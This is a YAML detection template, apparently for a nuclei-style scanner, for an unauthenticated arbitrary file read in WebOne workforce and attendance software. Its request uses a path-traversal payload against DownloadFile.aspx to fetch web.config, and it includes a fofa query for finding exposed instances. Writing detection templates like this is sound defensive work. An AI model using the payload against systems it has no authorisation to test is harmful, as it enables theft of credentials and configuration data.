# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - xml version=
          - publicKeyToken=
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/webForms/Download/DownloadFile.aspx?fileid=/../../web.config&flag=report'
id: webone-downloadfile-fileread
info:
  author: avic123
  description: |
    WebOne劳动力与考勤管理软件的/webForms/Download/DownloadFile.aspx接口存在任意文件读取漏洞，未经身份验证的攻击者可以通过该漏洞获取数据库敏感信息
    fofa："劳动力管理软件平台"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: medium
  name: WebOne劳动力与考勤管理套件DownloadFile.aspx任意文件读取漏洞
  severity: medium
  tags: webone,fileread,argus-import
